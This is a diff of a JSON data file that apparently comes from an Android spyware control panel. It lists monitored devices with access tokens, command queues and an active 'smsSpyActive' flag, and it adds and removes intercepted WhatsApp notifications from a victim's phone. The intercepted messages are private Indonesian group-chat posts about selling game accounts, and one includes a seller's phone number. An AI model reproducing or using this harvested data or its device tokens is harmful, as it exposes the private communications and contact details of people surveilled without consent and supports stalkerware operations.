@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777654660,
+    "lastSeen": 1776777660646,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (100 pesan): ~ BASS STR",
+        "content": "📷 SS DONE POLOSAN SG LUMUT SOLD 65K",
+        "time": "21/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777661173
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3530 pesan dari 22 chat",
+        "time": "21/04 20:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776777655070
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (961 pesan): ~ RIDEXY BUSINESS ALLSTORE ADMIN FULL BERIDENTITAS SELAIN [8745] CLONE.",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:44",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775442851
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3708 pesan dari 23 chat",
-        "time": "21/04 19:44",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775442787
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (77 pesan): ~ jall store",
-        "content": "📷 𝗙𝗢𝗥𝗠𝗔𝗧 𝗝𝗣 𝗕𝗬 𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘\n[BUKAN PUNYA ADMIN]\n\n☎NOMOR SELLER :+6285782152739\n📦AKUN :ff\n💎SPEK :gg bgt\n💸HARGA :250+\n⚙️LOG :bind\n🥷MC : 𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘\n\n𝗦𝗘𝗟𝗔𝗟𝗨 𝗠𝗘𝗡𝗚𝗚𝗨𝗡𝗔𝗞𝗔𝗡 𝗝𝗔𝗦𝗔 𝗔𝗗𝗠𝗜𝗡 [𝗝𝗔𝗟𝗟 𝗦𝗧𝗢𝗥𝗘] 𝗔𝗚𝗔𝗥 𝗧𝗘𝗥𝗛𝗜𝗡𝗗𝗔𝗥 𝗗𝗔𝗥𝗜 𝗥𝗜𝗣/𝗣𝗘𝗡𝗜𝗣𝗨𝗔𝗡‼️",
-        "time": "21/04 19:43",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775396693
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777652973,
+    "lastSeen": 1776777658984,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777653050,
+    "lastSeen": 1776777660174,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
